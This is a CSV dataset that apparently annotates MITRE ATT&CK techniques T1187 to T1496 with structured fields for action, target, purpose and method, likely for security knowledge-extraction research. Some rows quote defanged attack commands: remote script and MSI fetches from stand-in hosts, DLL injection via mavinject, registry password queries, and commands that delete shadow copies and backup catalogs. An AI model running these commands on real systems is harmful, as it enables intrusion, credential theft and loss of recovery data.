0,1,3,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,,,254,credential access,forced authentication,t1187,send,attachment,containing resource link,user's system accesses the untrusted resource,,,gain access to user account hash,gain access,user account hash,through spearphishing; through forced SMB authentication; using template injection;file[:]//[remote address]/normal.dotm,force; use;use ,smb authentication; template injection/spearphishing; file[:]//[remote address]/normal.dotm,,,,
,1,,381,command and control,multi-hop proxy,t1188,chain/link,proxy,multiple,,,,disguise  the source of malicious traffic,disguise,source,using several proxies,use,several proxy/tor ,proxy-multiple,,traffic-redirected(??),
,,,187,initial access,drive-by compromise,t1189,deliever-code,browser,,user has-a visit-malicious-website,,,display contant OR run/execute script,display / run,content / script,"use JavaScript, iFrames, and cross-site scripting;Built-in web application interface",use,JavaScript; iFrames;cross-site scripting;Built-in web application interface,,,,
1,,,186,initial access,drive-by compromise,t1189,inject-code/insert-object,browser,,,,,,,,"use JavaScript, iFrames, and cross-site scripting;Built-in web application interface",use,JavaScript; iFrames;cross-site scripting;Built-in web application interface,,,,
,,,189,initial access,drive-by compromise,t1189,insert-web-object,browser,malicous,,,,display contant OR run/execute script,display / run,content / script,"use JavaScript, iFrames, and cross-site scripting;Built-in web application interface",use,JavaScript; iFrames;cross-site scripting;Built-in web application interface,email-address-discoverable,access-gained,access-gained,
,,,188,initial access,drive-by compromise,t1189,use/inject/post,ads,malicous,,,,display contant OR run/execute script,display / run,content / script,"use JavaScript, iFrames, and cross-site scripting;Built-in web application interface",use,JavaScript; iFrames;cross-site scripting;Built-in web application interface,,,,
1,,,212,initial access,exploit public-facing application,t1190,take-advantage/exploit/abuse,software-weakenss/bug/weakness/glitch/vulnerability,software/data/command/databases/sql/standard services/smb/ssh/web servers,,,,cause unintended or unanticipated behavior,cause,unintended or unanticipated behavior,use software/data/command/databases/sql/standard services/smb/ssh/web servers,use,software/data/command/databases/sql/standard services/smb/ssh/web servers,,,,
,,,87,defense evasion,cmstp,t1191,supply-cmstp.exe,INF file/.inf file,infected/malicious,,,, load /execute  dlls /com scriptlets (sct) /command; bypass  applocker / whitelisting defenses;bypass user account control technique,load/execute;bypass, dlls /com scriptlets (sct) /command; applocker / whitelisting defenses/bypass user account control technique ,infecting inf file with malicious command,infect-inf-file,malicious command,,,,
,,,655,initial access,spearphishing link,t1192,include,link,,link/URL is-a clikced,,,interact with email reader/embeded image;verify email adress;solicit user info;download code by user clicking,interact ; exploit ; verify,email reader/embeded image ; end system ; receipt,accompany  link with social engineering text,accompany/attach,link with social engineering text,,,,
,,,654,initial access,spearphishing link,t1192,prompt/solicit,user,,,,,"download applications, documents, zip files, or even executables",download,application/document/zip file/executable,using an exploit;accompany  link with social engineering text,use;accompany/attach,browser exploit;link with social engineering text,,,,
1,,,650,initial access,spearphishing link,t1192,use,URL/link,,user click/copy/paste url; leverage user execution,,,download malware contained in email ; avoid defenses that may inspect email attachments,download ; avoid,malware ; defense,accompany  link with social engineering text,accompany/attach,link with social engineering text,"account-address-discovered; 
 techniqe:discovery",,,
,,,648,initial access,spearphishing attachment,t1193,"execute, exploite","email payload, vulnerability",".doc, .PDF, .zip, .exec file extension / microsoft office documents, executables, pdfs, or archived files","attachment is-a opened
 techniqe: User Execution",open,attachment,"open attachment, gain execution",gain,execuation,"using Microsoft Office documents, executables, PDFs, or archived file",use,Microsoft Office document/executable/ PDF/archived file,,,,
,,,649,initial access,spearphishing attachment,t1193,manipulate/attach,file extensions/icons,,,,,hide extension of exeutable files,hide,executable extension,"using Microsoft Office documents, executables, PDFs, or archived file",use,Microsoft Office document/executable/ PDF/archived file,,,,
1,,,647,initial access,spearphishing attachment,t1193,send,email-with-file-attachment,".doc, .PDF, .zip, .exec file extension / microsoft office documents, executables, pdfs, or archived files","attachment is-opened
 Technqoue: User Executable",open,attachment,"open attachment, gain execution",gain,execuation,"using Microsoft Office documents, executables, PDFs, or archived file",use,Microsoft Office document/executable/ PDF/archived file,,,,
,,,657,initial access,spearphishing via service,t1194,"create , message , send","social media account , employee , link/attachment","fake , ,malicious",,,,"<what>open<\what><where>attachment<\where> by user/
 <what>click <\what><where>link<\where> by user",open;click,attachment;link,"potential job opportunities; asking about services, policies, and software that's running in an environment",ask about,"job opportunity/service, policy/ software ","account-address-discovered; 
 techniqe:discovery",,,
1,,,656,initial access,spearphishing via service,t1194,send,message/content,,user info discovery,,,<what>generate<\what> <where>rapport<\where> with the target ; <what>get<\what> the target's interest,generate get,rapport,"social media services , personal webmail , non-enterprise controlled services",leverage,user execution/socail media/social media services/personal webmail/non-enterprise controlled service,"account-address-discovered; 
 techniqe:discovery",,,
,,,675,initial access,supply chain compromise,t1195,add,code,malicious,supplychain,,,gain execution for access,gain,execution,,,,,,,
,,,673,initial access,supply chain compromise,t1195,add/install,software,malicious,access to system,,,gain execution for access,gain,execution,,,,"account-address-discovered; 
 techniqe:discovery",,,
,,,670,initial access,supply chain compromise,t1195,Compromise/infect,system image,,image provided,,,gain execution for access,gain,execution,code,,code,supplychain-system-access,execution-for-access -gained,execution-for-access -gained,
1,,,669,initial access,supply chain compromise,t1195,manipulate,development tool/development environment/source code repository/source /code/software update/distribution mechanisms,,software provided,,,gain execution for access,gain,execution,,,,software-purshace,execution-for-access -gained,execution-for-access -gained,
,,,671,initial access,supply chain compromise,t1195,replace,software,,access to system,,,gain execution for access,gain,execution,image,,image,open-source-installed,execution-for-access -gained,execution-for-access -gained,
,,,672,initial access,supply chain compromise,t1195,sell,counterfeit-product,"modified , counterfeit",purchase product,,,gain execution for access,gain,execution,selling s/w,,selling s/w,"account-address-discovered; 
 techniqe:discovery",message-deleiverd,message-deleiverd,
,,,674,initial access,supply chain compromise,t1195,target/use/utilize,open source project/open source code,malicious,use open source,,,add malicious code,add,code,open source,use,open source code,"account-address-discovered; 
 techniqe:discovery",,,
,,,114,defense evasion,control panel items,t1196,use/deliver/execute,control panel item file/.cpl file,execution payloads,,,, execute  arbitrary  command;bypass application / file extension whitelisting,execute;bypass,command; application/file extension whitelisting,via Spearphishing Attachment;using command line/ programmatically / application programming interface (API) call; double-click the file,use; double-click,Spearphishing Attachment/command line/ programmatically / application programming interface (API) call; double-click the file,,,,
,,,58,defense evasion,bits jobs,t1197,abuse/use,bits/bits execution/bits upload functionality,,,,,"download, execute, and even clean up after running malicious code;  perform Exfiltration Over Alternative Protocol;allow persistence",download/execute/clean-up,malicious code,creating long-standing jobs (the default maximum lifetime is 90 days and extendable)invoking an arbitrary program when a job completes or errors (including after system reboots),create;invoke,long-standing job; program when a job complete or error,,,,
,,,622,"defense evasion,persistence",sip and trust provider hijacking,t1198,use/abuse/hijack,sip and trust provider/sip/trust provider,,,,,"<what>subvert<\what> <where>trust controls<\where> , <what>bypass<\what> <where>security policies<\where>; <what>mislead<\what> <where>operating system<\where> and <where>whitelisting tools<\where> , <what>classify<\what> malicious (or any) <where>code<\where> as signed",subvert ; bypass;mislead,trust control; security policy; operating system/whitelisting tool,modifying SIP dll  registry value;modifying FuncName registry value; modifying SIP dll  registry value; HKLM\SOFTWARE[\WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg{{SIP_GUID}}to the DLL providing a SIP?s CryptSIPDllGetSignedDataMsg function; HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData{{SIP_GUID}} to the DLL providing a SIP?s CryptSIPDllVerifyIndirectData function; HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\Providers\Trust\FinalPolicy{{trust provider GUID}} to the DLL providing a trust provider?s FinalPolicy function; point to malicious dll,modify;modify;modify;modify;modify;point,dll  registry value;FuncName registry value;HKLM\SOFTWARE[\WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg{{SIP_GUID}} to the DLL providing SIP?s CryptSIPDllGetSignedDataMsg function; HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData{{SIP_GUID}} to the DLL providing a SIP?s CryptSIPDllVerifyIndirectData function; HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\Providers\Trust\FinalPolicy{{trust provider GUID}} the DLL providing a trust provider?s FinalPolicy function ; malicious dll,,,,
1,,,734,initial access,trusted relationship,t1199,exploit/use/access,connection/network,existing,connecton is-a not protected/ connecton is-a insecure,,,gain access to network ,gain-access,network/system,exploit access through trusted third party relationship; use valid account,use,trusted third party relationship/valid account,supplychain-system-access,valid account,execution-for-access -gained,
,1,,381,initial access,hardware additions,t1200,add/introduce/modify,hardware/computer accessories/firmware,,,,,"<what>tapping/monitor<\what> <where>network<\where>/
 <what> break man-in-the middle<\what><where> encryption <\where>/
 <what>inject<\what><where> keystroke<\where> /
 <what>read<\what> <where> kernel memory via dma <\where>/
 <what> add/install <\what> <where> new wireless access <\where>",tapp/monitor;break;inject;read;add/install,network;man-in-the-middle encryption;keystroke;kernel memory;wireless access,,,,hardware-access,credential-access/traffic-access,credential-access/traffic-access,
,,,447,discovery,password policy discovery,t1201,access-detailed-information,password policy,,,,,,create-list-of;launch,common-password;dictionary/brute force attack,,use,net accounts ;net accounts /domain;chage -l;cat /etc/pam.d/common-password;pwpolicy getaccountpolicies,,,,
,,,295,defense evasion,indirect command execution,t1202,execute,command,without invoking cmd,,,,defense evasion;perform arbitrary execution while subverting detections;mitigation controls (such as group policy) that limit/prevent the usage of cmd file extensions more commonly associated with malicious payloads.,evade;perform,evasion;execution,use Forfiles/the Program Compatibility Assistant (pcalua.exe)/ components of the Windows Subsystem for Linux (WSL)/ Run window/via scripts,use,Forfiles/the Program Compatibility Assistant (pcalua.exe)/ components of the Windows Subsystem for Linux (WSL)/ Run window/ scripts,,,,
,,,213,execution,exploitation for client execution,t1203,exploit,web browser vulnerability/microsoft office application vulnerability/commonly used software vulnerability/Adobe Reader vulnerability/ Flash vulnerability/microsoft word vulnerability/Equation Editor vulnerability/WinRAR vulnerability/Hadoop vulnerability/ Redis vulnerability/ActiveMQ vulnerability/microsoft sharepoint vulnerability,CVE,,,,execute code,execute,code,"through Drive-by Compromise and Spearphishing Link; through Spearphishing Attachment, Spearphishing Link, and Spearphishing via Service",use,Drive-by Compromise technique/Spearphishing Link technique/Spearphishing Attachment technique/Spearphishing Link technique/Spearphishing via Service  technique,,,,
,,,744,execution,user execution,t1204,weaponize/use,executable/file/.doc  file/.pdf  file/.xls  file/ .rtf  file/.scr  file/ .exe  file/.lnk file/ .pif file/ .cpl file,,"user opens a malicious executable delivered via spearphishing attachment; 
 when a user clicks on a link delivered via spearphishing link; 
adversary places a file in a shared directory or on a user's desktop",,"executable , link , file","exploitation of a browser or application vulnerability;
execute code; bait a user into clicking",exploit;execute;bait,browser- vulnerability / application vulnerability; code;user-into-clicking,delivering via  Spearphishing Attachment technique/Spearphishing Link technique ,deliver/use,Spearphishing Attachment technique/Spearphishing Link technique,,Exploitation for Client Execution. ,,
,,,461,"defense evasion,persistence,command and control",port knocking,t1205,use,port knocking,,,,,"hide open ports from access , enable a port",hide;enable,open-port;port,sending series-of-packet;use libcap libraries,send;use,series-of-packet;libcap-libraries,port-closed,,multiple-connection-attempted,
,,,667,privilege escalation,sudo caching,t1206,use/modify,sudo caching configuration/tty_ticket,,issue command killall terminal,,,<what>escalate<\what> <where>privileges<\where> without needing the user's password,escalate,privilege without user password,disabling tty_tickets file,disable,tty_tickets,,,,
,,,160,defense evasion,dcshadow,t1207,inject-change/replicate-change,active directory domain object/active directory credential/active directory key,,once registered requires administrator privileges/KRBTGT hash,,,obstruct forensic analysis; perform  sid-history injection ;establish backdoors for persistence,"obstruct; perform,establish",forensic analysis; sid-history injection ;backdoor,register a rouge DC; create new server and nTDSDSA object;alter/delete replication /associated metadata;manipulate AD object/account/access control list/schema,register;create;alter/delete;manipulate, rouge DC; new server and nTDSDSA object; replication /associated metadata; AD object/account/access control list/schema,,,,
,,,320,credential access,kerberoasting,t1208,request/capture; crack,"TGS services ticket/Kerberos Ticket Granting Service service Ticket/TGS;
hash",offline,Kerberos Ticket Granting Ticket/TGT is required;,,,expose plaintext passwords;enable persistence; privilege escalation; perform lateral movement,expose;enable;escalate;perform,plaintext credentials;persistance;privilege; lateral movement,via valid account; performing offline Brute force,perform,brute force technique; valid account technique,brute force technique; valid account technique,,,
,,,721,persistence,time providers,t1209,register/enable,DLL,malicious,<condition><object>administrator privileges<\object> are required<\condition> for time provider registration,<object>administrator privileges<\object> are required,administrator privileges,<what>establish<\what>persistence,establish,persistence,using time provider registry key; HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\,use,time provider registry key; HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\,,,,
,,,228,lateral movement,exploitation of remote services,t1210,exploit-vulnerability,SMP/RDP/MYSQL/web server service,,network service has-a scanned ,scan,network service,execute malicious code;move laterally to system,execute;move-laterally,code; system,take advantage of error in program/service/os/kernel,take advantage,error,system-remotely-accessible; vulnerability-exist,Exploitation for Privilege Escalation,remote-communication-occurred,
,,,218,defense evasion,exploitation for defense evasion,t1211,use/abuse/takes advantage,programming error/software vulnerability,"program, service,operating system software,kernel",have prior knowledge,,,<what> execute <\what> <where> adversary-controlled code <\where>,execute,adversary-controlled code,reconnaissance about existing vulnerability; using security software discovery technique,reconnaissance,vulnerability;security software discovery technique,,,,
,,,217,credential access,exploitation for credential access,t1212,exploit,credential access,,,,,privilege escalation depending on the process targeted or credentials obtained,,,,,,,,,
,,,215,credential access,exploitation for credential access,t1212,target/use,credentialing mechanisms/ authentication mechanisms/kerberos,,,,,exploitation<what> gain access <\what> to useful <where> credentials <\where> or <what> circumvent <\what> the <where> process <\where> <what> gain access <\what> to <where> systems <\where>;forge kerberos tickets,gain access;circumvent;gain access,credentials;process;systems,domain user permissions,,,,,,
,1,,214,credential access,exploitation for credential access,t1212,use/abuse/takes advantage,programming error,"program, service,operating system software,kernel",,,,<what> execute <\what> <where> adversary-controlled code <\where>,execute,adversary-controlled code,,,,,,,
,1,,151,collection,data from information repositories,t1213,leverage/use,information repositories,"policies, procedures, and standards/physical / logical network diagrams /system architecture diagrams/ technical system documentation/ testing / development credentials/ work / project schedules/ source code snippets/ links to network shares / common information repositories /microsoft sharepoint/atlassian confluence",,,,<what> mine <\what> valuable <where> information <\where>,mine,information,,,,information-repository-access,data-collected,data-collected,
,1,,143,credential access,credential in registry,t1214,query/find,password info registry key,related to password information,,,,<what> looking/search <\what> for <where> credentials <\where> and <\where> passwords <\where> that have been stored; automatic logons,looking/search/use,credentials,local machine hive: <where> reg query hklm /f password /t reg_sz /s <\where>current user hive:<where> reg query hkcu /f password /t reg_sz /s <\where>,use,"reg utility;reg query hklm /f password /t reg_sz /s,reg query hkcu /f password /t reg_sz /s",,,,
,,,322,persistence,kernel modules and extensions,t1215,use,loadable kernel modules/ lkms/kext/kextload/kextunload,,,,,"covertly persist on a system and evade defenses;hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users",maintain;evade;hide;tamper;provide/enable,persistence;defense;file/process/network activity; log; backdoor/root-access,,,,,,,
,,,617,"defense evasion,execution",signed script proxy execution,t1216,use,signed script/PubPrn.vbs,signed with trusted certificates,,,,"proxy  execution of malicious files , bypass signature validation restrictions and application whitelisting solutions",proxy-execute ; bypass,files ; signature validation restriction/application whitelisting solution,cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png,,cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png,,,,
,,,65,discovery,browser bookmark discovery,t1217,enumerate/list,browser bookmark,,,,,,reveal/learn,"personal information/banking sites/interests/social media, compromised host",,,,,,,
,,,607,"defense evasion,execution",signed binary proxy execution,t1218,use,msiexec.exe,signed with trusted digital certificate,,,,launch malicious msi files ; bypass application whitelisting and signature validation;execute DLL/file,launch ;bypass;execute,msi file;application whitelisting solution/signature validation restriction;DLL/file,msiexec.exe /q /i c:\path\to\file.msi ; msiexec.exe /q /i http[:]//site[.]com/file.msi ; msiexec.exe /y c:\path\to\file.dll,,msiexec.exe /q /i c:\path\to\file.msi ; msiexec.exe /q /i http[:]//site[.]com/file.msi ; msiexec.exe /y c:\path\to\file.dll,,,,
,,,612,"defense evasion,execution",signed binary proxy execution,t1218,use,mavinject.exe,signed with trusted digital certificate,,,,input a dll into a running process,input-dll/inject-dll,process,"c:\program files\common files\microsoft shared\clicktorun\mavinject32.exe <pid> /injectrunning <path dll> , c:\windows\system32\mavinject.exe <pid> /injectrunning <path dll>",,"c:\program files\common files\microsoft shared\clicktorun\mavinject32.exe <pid> /injectrunning <path dll> , c:\windows\system32\mavinject.exe <pid> /injectrunning <path dll>",,,,
,,,614,"defense evasion,execution",signed binary proxy execution,t1218,use,SyncAppvPublishingServer.exe,signed with trusted digital certificate,,,,run powershell scripts without executing powershell.exe,run,powershell script,,,,,,,
,,,616,"defense evasion,execution",signed binary proxy execution,t1218,use,odbcconf.exe,signed with trusted digital certificate,,,,execute dll,execute, dll,"regsvr option , odbcconf.exe /s /a {regsvr c:\users\public\file.dll}",,"regsvr option , odbcconf.exe /s /a {regsvr c:\users\public\file.dll}",,,,
,1,,534,command and control,remote access tools,t1219,use,desktop-support-software/remote-access-software,"Team Viewer,Go2Assist, LogMein, AmmyyAdmin","used as <object>legitimate technical support software<\object>, and may be <condition>whitelisted<\condition> within a target environment",whitelisted,legitimate technical support software,"establish an interactive command and control channel , redundant access , establish an interactive remote desktop session , establish a reverse connection , back-connect to a service or adversary controlled system",establish,C2-channel/redendant-access/interactive-rdp/reverse-connection,"using desktop support and remote access software , team viewer , go2assist , logmein , ammyyadmin",use,desktop-support-software/remote-access-software/remote-access-tool/team-viewer/go2assit/logmein/ammyyadmin,remote-access-software-whitlisted,Redundant Access,remote-access-tool-used,
,,,784,"defense evasion,execution",xsl script processing,t1220,execute,file/javascript/script/jscript/vbscript,within local/remote XSL file,msxsl.exe is dropped,,,bypass application whitelisting,bypass,application whitelisting,"using msxsl.exe; using windows management instrumentation; using wmi;msxsl.exe customers[.]xml script[.]xsl; msxsl.exe script[.]xsl script[.]xsl
;msxsl.exe script[.]jpeg script[.]jpeg;
wmic process list /FORMAT:evil[.]xsl; wmic os get /FORMAT:""https[:]//example[.]com/evil[.]xsl""",use,"msxsl.exe/wmi/windows management instrumentation;
msxsl.exe customers[.]xml script[.]xsl; msxsl.exe script[.]xsl script[.]xsl
;msxsl.exe script[.]jpeg script[.]jpeg;
wmic process list /FORMAT:evil[.]xsl; wmic os get /FORMAT:""https[:]//example[.]com/evil[.]xsl""",,,,
,,,707,defense evasion,template injection,t1221,inject,template reference/SMB URL/HTTPS URL,document,the <condition><object>document<\object> is loaded<\condition>,<object>document<\object> is loaded,document,"enable malicious <what>payloads <\what> to be <what>fetched<\what> and <what>executed<\what> , evade static detections;<what>conceal<\what> malicious <where>code<\where> to be executed via documents",enable;evade;conceal,payload fetched/execution;static detection;code,using template injection,using,template injection,,"spearphishing attachment , taint shared content, forced authentication",,
,,,243,defense evasion,file permissions modification,t1222,modify,file permission/file attribute/directory permission/directory attribute,,require taking ownership of a file and/or elevated permissions such as administrator/root depending on the file's existing permissions,,,"evade intended dacls;enable malicious activity such as <what> modifying, replacing, or deleting <\what> specific <where>files<\where>",evade; enable-modification/enable-replacement-enable-deletion,dacls;file,changing specific access rights,change,specific access right,,,,
,,,103,defense evasion,compiled html file,t1223,load/execute,CHM content/CHM file/compiled html file,contain embedded amclicious payload,,,,<what> conceal <\what> <where> malicious code <\where>;bypass application whitelisting,conceal;bypass,malicious code;application whitelisting,deliver custom CHM file containing embedded payload; using user execution technique,deliver;use,custom CHM file containing embedded payload; user execution technique,,,,
,,,199,defense evasion,execution guardrails,t1480,use,guardrails/environmental keying,,,,,"help protect their ttps and evade detection, sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult;avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection;prevent exposure of capabilities",help protect;evade;avoid packaging/avoid send;prevent,ttps;detection/sandbox detection/anti-virus detection/crowdsourcing of information/reverse engineering; decryption key;exposure of capabilities,"using environment specific value;using target specific value; using network share names/attached physical devices/ filename/joined Active Directory (AD) domains/"" local/external IP addresse"" /physical device/"" software/software version""/ system time",use,"environment specific value/target specific value/network share names/attached physical devices/ filename/joined Active Directory (AD) domains/"" local/external IP addresse"" /physical device/"" software/software version""/ system time",,,,
,1,,765,command and control,web service,t1481,use,web service/common service,"existing/legitimate external,offered by google or twitter",once <condition>infected<\condition>,infected/compromised,system,relaying commands to a compromised system;hide in expected noise,relay/hide,C2 command,"post content, known as a dead drop resolver on web services with embedded (and often obfuscated/encoded) domains or ip addresses",post,dead-drop-resolver,System-compromised,,traffic-redirected(??),
,,,183,discovery,domain trust discovery,t1482,enumerated/list,domain trust,,,,,"<what> conduct <\what><where>sid-history injection <\where>, <where>pass the ticket <\where>, and <where>kerberoasting<\where>",conduct,"sid-history injection, pass the ticket, kerberoasting",,use,"dsenumeratedomaintrusts() win32 api call , .net methods , ldap",,,,
,,,182,discovery,domain trust discovery,t1482,gather-information/dicover,domain trust relationship/domain trust information,,,,,identify <tech> lateral movement opportunities <\tech> in windows multi-domain/forest environments,identify,Lateral Movement opportunities in Windows multi-domain/forest environments,,,,,,,
,1,,179,command and control,domain generation algorithms,t1483,employ/use,domain generation algorithm (dgas)/DGA,,,,,dynamically identify a destination for command and control traffic,dynamic-identification,destination,concatenating words together instead of letters;generating a different domain for each time period;incorporate a seed value,concatenate;incorporate;generate,words together;seed value;different domain,System-compromised,Fallback Channels,multiple-domain-checked,
,,,261,defense evasion,group policy modification,t1484,modify,group policy object/gpos/user right/gpo setting,,,,,"subvert the intended discretionary access controls for a domain;implement scheduled task, disabling security tools, remote file copy, create account, service execution;achieve a subtle AD backdoor",subvert;escalate;implement;achieve,discretionary access control;privilege;scheduled task technique/ disabling security tool technique/remote file copy technique/ create account technique/ service execution technique;AD backdoor,"use New-GPOImmediateTask script / SeEnableDelegationPrivilege; modify ""<GPO_PATH>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"" ; ""set in <GPO_PATH>\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf""",use;modify ;set,"New-GPOImmediateTask script / SeEnableDelegationPrivilege;""<GPO_PATH>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"";"" <GPO_PATH>\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf""",,,,
,,,800,Impact,Data Destruction,T1485,destroy/delete/remove/overwrite,data/file/directory,,adversary has-a write permission,,,interrupt availability; make data irrecoverable,interrupt;make-irrecoverable,availability;data,using command line argument/del/rm,use,command-line-argument/del/rm,write-permission-granted,Inhibit System Recovery,data-deleted,
,,,801,Impact,Data Encrypted for Impact,T1486,encrypt,data/file,,adversary has-a write permission,,,interrupt availability; make data inaccessable; extract monetary compensation,interrupt;make-inaccessable,availability;data,withholding decryption key,withhold,decryption-key,write-permission-granted,Inhibit System Recovery,data-encrypted;file-encrypted,
,,,804,Impact,Disk Structure Wipe,T1487,corrupt/wipe/overwrite/replace,disk-data-structure/MBR,,adversary has-a root permission,,,interrupt availability,interrupt,availability,overwriting critical data,overwrite,critical-data,root-permission-granted; write-permission-granted,,disk-data-structure-overwritten,
,,,803,Impact,Disk Content Wipe,T1488,erase-content/overwrite-content/wipe-content,storage-device,,adversary has-a write permission,,,interrupt availability; make data irrecoverable,interrupt;make-irrecoverable,availability;data,using third part driver/RawDisk,use,third-part-tool/RawDisk,write-permission-granted,,data-edeleted,
,,,808,Impact,Service Stop,T1489,stop/disable,service,,system is-a already compromised,,,make service unavailable,make-unavailable,service,,,,System-compromised,Data Destruction;Data Encrypted for Impact,service-stopped/service-disabled,
,,,812,Impact,Inhibit System Recovery,T1490,delete/remove/disable/turn-off,OS-data/recovery-service,,,,,prevent-recovery,prevent,recovery,using native windows utility,use,native-windows-utility,System-compromised,,data-deleted;service-disabled,
,,,812,Impact,Inhibit System Recovery,T1490,delete/remove/disable/turn-off,volume-shadow-copy/windows-backup-catalog/windows-recovery-feature,,,,,prevent-recovery,prevent,recovery,using native windows utility/ vssadmin.exe/wbadmin.exe/bcdedit.exe/WMI,use,"native-windows-utility/ vssadmin.exe/""vssadmin.exe delete shadows /all /quiet""/wbadmin.exe/""wbadmin.exe delete catalog -quiet""/bcdedit.exe/""bcdedit.exe /set {{default}} bootstatuspolicy ignoreallfailures & bcdedit /set {{default}} recoveryenabled no""/WMI/""wmic shadowcopy delete""",System-compromised,,data-deleted;service-disabled,
,,,802,Impact,Defacement,T1491,deface/modify/replace,website/visual-content,,,,,claim credit for intrusion; delivery of message and intimidation; spread propaganda,spread;claim;deliver,propaganda;intrusion-credit;message-intimidation,using offensive images,,,system-compromised,,visual-content-modified,
,,,807,Impact,Stored Data Manipulation,T1492,alter/modify/manipulate/insert/delete,static-data/data/stored-data,,adversary-has-a root permission,,,hide activity,hide,activity,,,,root-permission-granted; write-permission-granted,,data-manipulated(??)/data-deleted,
,,,806,Impact,Transmitted Data Manipulation,T1493,alter/modify/manipulate,transmitted-data,,system is already compromised,,,hide activity,hide,activity,intercepting data over connection or between system process,intercept,data-over-connection/data-between-process,System-compromised,,data-manipulated(??),
,,,809,Impact,Runtime Data Manipulation,T1494,alter/modify/manipulate,runtime-data/binary,,system is-a already compromised,,,effect business-process/user-underting/decision-making,effect/manipulate,business-process/user-underting/decision-making,altering application binary,alter,application-binary,System-compromised,,data-manipulate/binary-modified,
,,,805,Impact,Firmware Corruption,T1495,corrupt-flash-memory-content/wipe-flash-memory-content/overwrite-flash-memory-content/replace-flash-memory-content,BIOS/firmware,,adversary has-a root permission,,,make device inoperable/unable to boot,,,overwriting non-volatile memory,overwrite,non-volatile,root-permission-granted; write-permission-granted,,firmware-modified,
,,,810,Impact,Resource Hijacking,T1496,hijeck/use,resource,,system is-a already compromised,,,solve resource intensive task;mine cryptocurrency,solve;mine,rource-intensive-task;cryptocurrency,using recource hijecking,use,recource hijecking,System-compromised,,resource-usage-high,
